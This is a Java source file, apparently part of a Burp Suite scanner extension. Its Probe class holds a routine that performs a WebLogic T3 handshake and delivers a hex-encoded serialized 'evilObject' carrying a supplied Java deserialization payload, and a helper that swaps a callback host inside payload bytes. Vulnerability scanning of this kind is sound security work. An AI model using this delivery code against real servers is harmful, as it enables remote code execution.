package probes;

import burp.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Arrays;
import java.util.HashMap;
import java.util.concurrent.TimeUnit;

public abstract class Probe {

    public abstract IScanIssue check(IHttpRequestResponse requestResponse);

    protected String sendT3Payload(Socket s, byte[] payload) {
        String handshake = "74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a";

        String t3ReqObject = "000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371"
                + String.format("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000%04xffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07", s.getPort())
                + "1a7727000d3234322e323134"
                + "2e312e32353461863d1d0000000078";

        String evilObject = "056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000"
                + Utilities.bytesToHex(payload)
                + "fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff";
        evilObject = String.format("%08x", evilObject.length() / 2 + 4) + evilObject;

        StringBuilder result = new StringBuilder();

        try {
            OutputStream writer = s.getOutputStream();
            InputStream reader = s.getInputStream();
            byte[] buffer = new byte[1024];

            // t3 handshake
            writer.write(Utilities.hexToBytes(handshake));
            writer.flush();
            TimeUnit.SECONDS.sleep(1);

            reader.read(buffer);

            // build t3 request object
            writer.write(Utilities.hexToBytes(t3ReqObject));
            writer.flush();
            TimeUnit.SECONDS.sleep(1);

            // send payload
            writer.write(Utilities.hexToBytes(evilObject));
            writer.flush();

            for (int i = 0; i < 3; i++) {
                buffer = new byte[1024 * 2];
                int len = s.getInputStream().read(buffer);
                result.append(new String(Arrays.copyOfRange(buffer, 0, len)));
                TimeUnit.MILLISECONDS.sleep(500);
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace(Utilities.err);
        }

        return String.valueOf(result);
    }

    protected IHttpRequestResponse getReq(IHttpService service, String path) {
        return Utilities.makeGetRequest(service, path, new HashMap<>());
    }

    protected IHttpRequestResponse getReq(IHttpService service, String path, HashMap<String, String> headers) {
        return Utilities.makeGetRequest(service, path, headers);
    }

    protected IHttpRequestResponse postReq(IHttpService service, String path, String data) {
        return Utilities.makePostRequest(service, path, null, data);
    }

    protected IHttpRequestResponse postReq(IHttpService service, String path, HashMap<String, String> headers, String data) {
        return Utilities.makePostRequest(service, path, headers, data);
    }

    @Deprecated
    byte[] changePayloadParam(byte[] origVector, String origParam, String newParam) throws IOException {
        int indexFirstCharacter = Utilities.helpers.indexOf(origVector, origParam.getBytes(), true, 0, origVector.length);
        int indexLastCharacter = indexFirstCharacter + origParam.length() - 1;

        int newCollaboratorVectorLength = newParam.length();

        byte[] preDNSVector = Arrays.copyOfRange(origVector, 0, indexFirstCharacter);
        byte[] postDNSVector = Arrays.copyOfRange(origVector, indexLastCharacter + 1, origVector.length);

        preDNSVector[preDNSVector.length - 1] = (byte) newCollaboratorVectorLength;

        ByteArrayOutputStream newVector = new ByteArrayOutputStream();
        newVector.write(preDNSVector);
        newVector.write(newParam.getBytes());
        newVector.write(postDNSVector);

        return newVector.toByteArray();
    }
}
